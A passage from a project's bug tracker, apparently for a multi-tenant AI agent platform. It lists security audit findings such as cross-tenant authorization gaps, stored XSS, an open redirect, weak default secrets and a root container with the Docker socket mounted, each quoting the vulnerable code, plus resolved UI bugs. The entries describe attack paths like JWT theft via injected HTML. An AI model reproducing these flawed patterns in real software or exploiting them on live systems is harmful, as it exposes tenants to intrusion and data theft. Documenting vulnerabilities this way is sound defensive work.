- **Remediation:** Use `SELECT ... FOR UPDATE` on the tenant row before the count check, or add a database-level trigger constraint.

### BUG-099: Team invite error reveals email domain exists in another tenant
- **Status:** Open
- **Severity:** Low
- **Category:** Information Disclosure (CWE-200)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/api/routes_team.py:297-299`
- **Description:** When inviting a user whose email already belongs to another tenant, the error message reveals this fact to the inviting admin. This leaks information about which email domains/addresses are registered on other tenants.
- **Impact:** Minor information disclosure. A tenant admin can enumerate whether specific email addresses are registered on the platform by attempting to invite them.
- **Remediation:** Use a generic error message like "Unable to invite this user" without revealing the reason is cross-tenant membership.

### BUG-051: BOLA — Persona assignment allows cross-tenant resource theft
- **Status:** Resolved
- **Severity:** Critical
- **Category:** Broken Object Level Authorization
- **Resolved:** 2026-03-28
- **File:** `backend/api/v1/routes_agents.py:576-581` (update), `backend/api/v1/routes_agents.py:372` (create)
- **Description:** Persona lookup during agent create/update has no tenant_id filter. Tenant A can assign Tenant B's persona to their agent via `persona_id`, gaining access to that tenant's persona configuration (embedded in agent context during inference).
- **Proof:** `persona = db.query(Persona).filter(Persona.id == request.persona_id).first()` — no tenant scoping.
- **Impact:** Cross-tenant data leakage of persona configurations. Attacker gains another tenant's prompt engineering / persona content.
- **Remediation:** Add tenant filter: `(Persona.is_system == True) | (Persona.tenant_id == caller.tenant_id) | (Persona.tenant_id.is_(None))`

### BUG-052: BOLA — Sentinel profile assignment allows cross-tenant security bypass
- **Status:** Resolved
- **Severity:** Critical
- **Category:** Broken Object Level Authorization
- **File:** `backend/api/v1/routes_studio.py:523-528`, `backend/api/routes_agent_builder.py:673-674`
- **Description:** SentinelProfile lookup during agent configuration has no tenant_id filter. Tenant A can assign Tenant B's sentinel security profile to their agent, either stealing a hardened config or applying a permissive one to bypass content filtering.
- **Proof:** `profile = db.query(SentinelProfile).filter(SentinelProfile.id == data.sentinel.profile_id).first()` — no tenant scoping.
- **Impact:** Cross-tenant security policy manipulation. Attacker can weaken their agent's security controls or steal another tenant's security configuration.
- **Remediation:** Add tenant filter: `(SentinelProfile.is_system == True) | (SentinelProfile.tenant_id == caller.tenant_id) | (SentinelProfile.tenant_id.is_(None))`

### BUG-053: Admin password reset transmits password in URL query string
- **Status:** Resolved
- **Severity:** Critical
- **Category:** Sensitive Data Exposure
- **File:** `backend/api/routes_global_users.py:560`
- **Description:** The `new_password` parameter is defined as `Query(...)`, meaning the password is sent in the URL: `POST /api/admin/users/5/reset-password?new_password=MyPass123`. URLs are logged by HTTP servers, proxies, load balancers, CDNs, and stored in browser history.
- **Proof:** `new_password: str = Query(..., min_length=8)` — password as query parameter.
- **Impact:** Plaintext passwords exposed in access logs, proxy logs, and log aggregation systems (Datadog, CloudWatch, ELK).
- **Remediation:** Change from `Query(...)` to a Pydantic request body model `ResetPasswordRequest(BaseModel)`.

### BUG-054: JWT secret key uses ephemeral fallback — sessions lost on restart
- **Status:** Resolved
- **Severity:** Critical
- **Category:** Broken Authentication
- **File:** `backend/auth_utils.py:17`
- **Description:** `JWT_SECRET_KEY` defaults to `secrets.token_urlsafe(32)` when env var is missing. This generates a new key on every container restart, invalidating all active sessions. In production, if `JWT_SECRET_KEY` is accidentally omitted, the system silently works during dev but breaks on every deploy.
- **Proof:** `JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))`
- **Impact:** All user sessions invalidated on container restart. Silent misconfiguration risk in production deployments.
- **Remediation:** Remove the fallback. Raise `RuntimeError` at startup if `JWT_SECRET_KEY` is not set or is shorter than 32 bytes.

### BUG-055: Backend container runs as root with Docker socket mounted
- **Status:** Resolved
- **Severity:** Critical
- **Category:** Container Escape / Privilege Escalation
- **File:** `docker-compose.yml:49,58`
- **Description:** The backend container runs as `user: root` and mounts `/var/run/docker.sock`. Any RCE vulnerability in the backend gives the attacker full Docker API access as root — effectively host-level access. This bypasses the non-root `USER tsushin` set in the Dockerfile.
- **Proof:** `user: root` (line 49) + `- /var/run/docker.sock:/var/run/docker.sock` (line 58)
- **Impact:** Container escape to host. An attacker with RCE can create privileged containers, read host filesystem, or pivot to other services.
- **Remediation:** Create a `docker` group in the container and run as non-root user in that group. Use Docker socket proxy (e.g., Tecnativa/docker-socket-proxy) to restrict API access to only needed endpoints.

### BUG-056: Stored XSS via search snippets rendered with dangerouslySetInnerHTML
- **Status:** Resolved
- **Severity:** Critical
- **Category:** Cross-Site Scripting (XSS) + Token Theft
- **File:** `frontend/components/playground/SearchResults.tsx:170,219` (render), `backend/services/conversation_search_service.py:549` (snippet generation)
- **Description:** Search snippets are generated from raw conversation message content with `<mark>` highlighting, then rendered in the frontend via `dangerouslySetInnerHTML={{ __html: result.snippet }}`. If a WhatsApp user sends a message containing `<script>` or `<img onerror=...>`, it gets stored and rendered unsanitized when any tenant user searches conversations. Combined with auth tokens stored in `localStorage`, this enables full account takeover.
- **Proof:** Backend: `snippet = pattern.sub(lambda m: f"<mark>{m.group(0)}</mark>", snippet)` — no HTML escaping of content. Frontend: `dangerouslySetInnerHTML={{ __html: result.snippet }}`.
- **Impact:** Account takeover. External attacker sends crafted WhatsApp message → stored in DB → rendered as HTML when searched → steals JWT from localStorage.
- **Remediation:** HTML-escape the snippet content before wrapping with `<mark>` tags in the backend. Or sanitize with DOMPurify in the frontend, allowing only `<mark>` tags.

### BUG-057: Rate limiter ignores per-client rate_limit_rpm configuration
- **Status:** Resolved
- **Severity:** High
- **Category:** Broken Rate Limiting
- **File:** `backend/middleware/rate_limiter.py:74-92`
- **Description:** The rate limiting middleware hardcodes `rate_limit = 60` RPM for all clients, ignoring the per-client `rate_limit_rpm` stored in `ApiClient` model. Clients configured with 10 RPM get 60, and clients configured with 600 RPM are throttled at 60.
- **Proof:** `rate_limit = 60  # Default RPM` — never reads client's configured value.
- **Impact:** Rate limiting policy is unenforced. Low-trust clients get 6x their intended limit. Premium clients are over-throttled.
- **Remediation:** Auth layer should set `request.state.rate_limit_rpm` from the resolved `ApiClient`; middleware reads it instead of the hardcoded value.

### BUG-058: JWT tokens valid for 7 days with no revocation mechanism
- **Status:** Resolved
- **Severity:** High
- **Category:** Broken Authentication
- **File:** `backend/auth_utils.py:19`, `backend/auth_routes.py` (logout endpoint)
- **Description:** JWT access tokens expire after 7 days. The logout endpoint does nothing server-side (returns a success message without blacklisting the token). A stolen token remains valid for up to 7 days with no way to revoke it. For a platform with WhatsApp automation, MCP instances, and shell command execution, this is a significant exposure window.
- **Proof:** `JWT_ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24 * 7` and logout: `return MessageResponse(message="Logged out successfully")`.
- **Impact:** Stolen JWT provides 7-day access to send WhatsApp messages, execute tools, and manage agents with no way to revoke.
- **Remediation:** Implement token revocation table, reduce lifetime to 24h with refresh tokens, or add `user.last_password_change` validation on decode.

### BUG-059: 44 remaining exception string leaks in API 500 responses
- **Status:** Resolved
- **Severity:** High
- **Category:** Information Disclosure
- **File:** 15 files including `routes_mcp_instances.py` (13), `routes_tts_providers.py` (4), `routes_sandboxed_tools.py` (4), `routes_prompts.py` (4), `routes_user_contact_mapping.py` (4)
- **Description:** BUG-035 fixed some files but 44 occurrences of `detail=f"...{str(e)}"` remain across 15 route files. Raw Python exceptions in responses leak file paths, library versions, SQL details, Docker errors, and internal network addresses.
- **Proof:** 44 matches of `detail=f".*{str(e)}"` pattern across backend route files.
- **Impact:** Attacker fingerprints internal infrastructure, database schema, and container topology to plan further attacks.
- **Remediation:** Replace all `str(e)` in HTTPException details with generic messages. Log full exceptions server-side with `logger.exception()`.

### BUG-060: Open redirect in Asana OAuth callback
- **Status:** Resolved
- **Severity:** High
- **Category:** Open Redirect
- **File:** `frontend/app/hub/asana/callback/page.tsx:61`
- **Description:** The Asana OAuth callback redirects to `data.redirect_url` from the backend response without validating it's a relative path or same-origin URL. If an attacker can control the `redirect_url` stored in the OAuth state, they can redirect authenticated users to a phishing page.
- **Proof:** `window.location.href = data.redirect_url || '/hub'` — no URL validation.
- **Impact:** Phishing via OAuth flow. User completes legitimate Asana OAuth, then gets redirected to attacker-controlled page.
- **Remediation:** Validate `redirect_url` is a relative path (starts with `/` and does not contain `//` or `@`). Reject absolute URLs.

### BUG-061: Setup wizard TOCTOU race condition
- **Status:** Resolved
- **Severity:** High
- **Category:** Race Condition / Authentication Bypass
- **File:** `backend/auth_routes.py:328-330`
- **Description:** The setup wizard checks `db.query(User).count() == 0` before allowing first-user creation. Two simultaneous requests can both pass this check before either commits, creating duplicate admin accounts. The `3/hour` rate limit (per IP) is insufficient during initial deployment if the container is reachable before setup completes.
- **Proof:** `@limiter.limit("3/hour")` with TOCTOU on user count check — no transactional lock.
- **Impact:** During initial deployment, attacker could race to create the first admin account before the legitimate operator.
- **Remediation:** Use a database-level lock or `SELECT ... FOR UPDATE` on the user table. Add a `SETUP_WIZARD_TOKEN` env var requirement.

### BUG-062: Weak default PostgreSQL password in docker-compose
- **Status:** Resolved
- **Severity:** High
- **Category:** Weak Credentials
- **File:** `docker-compose.yml:28`
- **Description:** PostgreSQL defaults to `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-tsushin_dev}`. If the operator doesn't set the env var, the database uses a trivially guessable password. While PostgreSQL isn't exposed to the host by default, any SSRF or container escape gives direct database access.
- **Proof:** `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-tsushin_dev}` — weak default.
- **Impact:** Database compromise via SSRF or lateral movement from any compromised container on the Docker network.
- **Remediation:** Generate a random password at first startup (via init script) or require `POSTGRES_PASSWORD` to be set explicitly. Add a startup health check that rejects weak defaults.

### BUG-063: Tone preset name/description fields lack HTML sanitization
- **Status:** Resolved
- **Severity:** High
- **Category:** Stored XSS
- **File:** `backend/api/routes_agents.py:59-66`
- **Description:** `TonePresetCreate` and `TonePresetUpdate` models have TODO comments for HTML sanitization but no `@field_validator` is implemented. The `AgentCreate` model correctly sanitizes with `strip_html_tags()`, but tone presets do not. These fields are rendered in the frontend.
- **Proof:** `# TODO: Add HTML sanitization validators` at lines 59-66 — validators never implemented.
- **Impact:** Stored XSS via tone preset name/description. Any tenant user with preset creation access can inject scripts rendered for other users.
- **Remediation:** Add `@field_validator` with `strip_html_tags()` matching the pattern already used in `AgentCreate`.

## Closed Issues

### BUG-042: enabled_channels always null in internal agent listing
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Added enabled_channels, whatsapp_integration_id, telegram_integration_id to list_agents agent_dict in routes_agents.py with JSON parsing logic.

### BUG-043: No validation on enabled_channels values
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Added field_validator on enabled_channels in all 4 Pydantic models (v1 and internal create/update). Only playground, whatsapp, telegram accepted. Invalid values return clear error. Deduplication applied.

### BUG-044: Duplicate nuclei tool commands
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Added deduplicate_tool_commands() to startup, UniqueConstraint on (tool_id, command_name) and (command_id, parameter_name). Rewrote update_existing_tools() to handle duplicates and orphans.

### BUG-045: Resource existence oracle via 403/404 differential
- **Status:** Resolved
- **Severity:** Low
- **Resolved:** 2026-03-27
- **Resolution:** Changed all cross-tenant access denied responses from 403 to 404 across 23 route files. Global admin access preserved via can_access_resource(). Legitimate business rule 403s kept.

### BUG-046: CORS allows all origins
- **Status:** Resolved
- **Severity:** Low
- **Resolved:** 2026-03-27
- **Resolution:** Made CORS configurable via TSN_CORS_ORIGINS env var. Default * for dev, comma-separated origins for production. Handles allow_credentials correctly per CORS spec. Added to docker-compose.yml and env.docker.example.

### BUG-029: Async queue dead-letters all API channel messages
- **Status:** Resolved
- **Severity:** Critical
- **Resolved:** 2026-03-27
- **Resolution:** Added "api" channel handler in queue_worker.py. API messages now processed and results persisted for polling.

### BUG-030: DELETE /api/v1/agents/{id} returns 204 but doesn't delete
- **Status:** Resolved
- **Severity:** Critical
- **Resolved:** 2026-03-27
- **Resolution:** Changed from soft-delete (is_active=False) to actual db.delete() with tenant-scoped default agent promotion.

### BUG-031: Contact uniqueness checks missing tenant_id scope
- **Status:** Resolved
- **Severity:** Critical
- **Resolved:** 2026-03-27
- **Resolution:** Added Contact.tenant_id filter to friendly_name, whatsapp_id, telegram_id uniqueness checks in update_contact.

### BUG-032: Agent is_default update affects all tenants
- **Status:** Resolved
- **Severity:** Critical
- **Resolved:** 2026-03-27
- **Resolution:** Scoped is_default unset queries to current tenant in create_agent and update_agent.

### BUG-033: Agent delete count/fallback picks from any tenant
- **Status:** Resolved
- **Severity:** Critical
- **Resolved:** 2026-03-27
- **Resolution:** Added tenant_id filter to agent count and next_agent fallback queries in delete_agent.

### BUG-034: Queue poll returns null result for completed items
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** mark_completed() now persists result dict into queue item payload for poll endpoint retrieval.

### BUG-035: 33+ raw exception string leaks in API responses
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Replaced str(e) with generic messages in routes_flows, routes_agent_builder, routes_flight_providers, routes_contacts. Errors logged server-side via logger.exception().

### BUG-036: GET /api/agents/{id}/skills returns 500 instead of 404
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Added `except HTTPException: raise` before generic exception handler in get_agent_skills.

### BUG-037: Agent description field aliased to system_prompt
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Added dedicated description column to Agent model with migration 0005. Public API now supports independent description field with backward-compatible fallback.

### BUG-038: Flow stats active_threads count unscoped across tenants
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Applied filter_by_tenant to ConversationThread and FlowRun queries in get_flow_stats. Added permission checks to stats, conversations, and template endpoints.

### BUG-039: XSS payload stored unescaped in agent name
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Added sanitizers.py with strip_html_tags(). Applied Pydantic field_validator on agent name/description in v1 API.

### BUG-040: Contacts page uses 34 gray-800 class elements
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Migrated all gray-800/900/700/600 tokens to tsushin design system tokens in contacts/page.tsx.

### BUG-041: SandboxedTool query loads all tenants into memory
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Pushed tenant filter to database using SQLAlchemy or_() in routes_agent_builder.py.

### BUG-041b: Sentinel GET /config missing permission check
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Added require_permission("org.settings.read") to get_sentinel_config endpoint.

### BUG-041c: Contact error message leaks cross-tenant contact_id
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Removed contact_id from update_user_contact_mapping error message.

### BUG-001: No mobile navigation — hamburger menu added
- **Status:** Resolved
- **Severity:** Critical
- **Resolved:** 2026-03-27
- **Resolution:** Added hamburger menu button (visible below md: breakpoint) and slide-in mobile nav drawer with all 6 nav links, user info, and logout. Implemented in LayoutContent.tsx.

### BUG-002: Login page uses wrong background color
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Replaced `bg-gray-50 dark:bg-gray-900` with `bg-tsushin-ink`.

### BUG-003: Login form card uses gray-800 instead of tsushin design tokens
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Replaced with `bg-tsushin-surface border border-tsushin-border rounded-2xl`.

### BUG-004: Login "Sign In" button uses bg-blue-600 instead of .btn-primary
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Replaced with `btn-primary` class.

### BUG-005: Agent Detail page uses completely different design language
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Full migration: header, tabs, buttons all using tsushin tokens and teal accents.

### BUG-006: Undefined tsushin-dark and tsushin-text CSS tokens
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Added `dark`, `darker`, `text` tokens to tailwind.config.ts.

### BUG-007: Undefined tsushin-darker token
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Added `darker: '#080B10'` token to tailwind.config.ts.

### BUG-008: Modal.tsx uses gray-800 instead of tsushin-elevated
- **Status:** Resolved
- **Severity:** High
- **Resolved:** 2026-03-27
- **Resolution:** Rewritten with `bg-tsushin-elevated`, backdrop blur, scale-in animation, rounded-2xl.

### BUG-009: form-input.tsx uses gray-800 instead of tsushin-deep
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Migrated to `bg-tsushin-deep`, `border-tsushin-border`, teal focus ring.

### BUG-010: Auth pages use gray-900 backgrounds
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** All auth pages migrated to `bg-tsushin-ink`.

### BUG-011: Settings Team "Invite Member" button uses blue-600
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Migrated to `btn-primary`.

### BUG-012: Sentinel page uses gray-600 borders and gray-800 textareas
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Fixed by form-input.tsx base class migration.

### BUG-013: Settings Organization uses gray-800 inputs and blue-600 buttons
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Fixed by form-input.tsx migration.

### BUG-014: Settings Security page uses gray-600 input backgrounds
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Fixed by form-input.tsx migration.

### BUG-015: Settings Billing "View All Plans" button uses blue
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Migrated to design system button.

### BUG-016: System Tenants uses purple-600 button and gray-800 inputs
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Purple → `btn-primary`, inputs fixed by form-input migration.

### BUG-017: Agent sub-components use bg-white dark:bg-gray-800
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** All 6 agent component managers migrated to tsushin tokens.

### BUG-018: System admin pages use light-mode-first patterns
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** All 4 system admin pages migrated.

### BUG-019: Contacts create modal uses gray-800 and blue buttons
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Modal.tsx wrapper fixed globally.

### BUG-020: Playground cockpit.css overrides tsushin-accent with purple
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Changed `--tsushin-accent` from #8b5cf6 to #00D9FF. Also aligned --tsushin-deep, --tsushin-surface, --tsushin-elevated variables.

### BUG-021: Playground references unloaded fonts
- **Status:** Resolved
- **Severity:** Low
- **Resolved:** 2026-03-27
- **Resolution:** Font fallback acceptable; tsushin-text token added.

### BUG-022: Hardcoded hex colors in playground components
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Replaced all hardcoded hex backgrounds in 8 components with tsushin tokens.

### BUG-023: MessageActions.tsx uses inline style hex colors
- **Status:** Resolved
- **Severity:** Low
- **Resolved:** 2026-03-27
- **Resolution:** tsushin-dark token now defined; values align.

### BUG-024: ThreadHeader uses !important JSX style block
- **Status:** Resolved
- **Severity:** Low
- **Resolved:** 2026-03-27
- **Resolution:** Removed entire `<style jsx>` block. Elements use existing inline styles that match tsushin-deep.

### BUG-025: playground.css uses 38+ !important declarations
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Removed 41 of 42 !important declarations. Aligned :root variables with tsushin tokens. 1 kept (required to override inline style).

### BUG-026: Inconsistent z-index scale
- **Status:** Resolved
- **Severity:** Low
- **Resolved:** 2026-03-27
- **Resolution:** Standardized 12 z-index values across 9 files. Removed z-[9999] and inline zIndex styles, replaced with consistent scale (z-30 dropdowns, z-40 sidebars, z-50 modals, z-[80] toasts, z-[90] onboarding).

### BUG-027: No global toast/notification system
- **Status:** Resolved
- **Severity:** Medium
- **Resolved:** 2026-03-27
- **Resolution:** Created ToastContext + ToastContainer with design system styling. Migrated 40 alert() calls in 6 priority files (agents, contacts, personas, flows, hub). Remaining files can be migrated incrementally.

### BUG-028: Agent Projects page has duplicate Security tab
- **Status:** Resolved
- **Severity:** Low
- **Resolved:** 2026-03-27
- **Resolution:** Removed duplicate Security link. Empty state was already properly implemented.
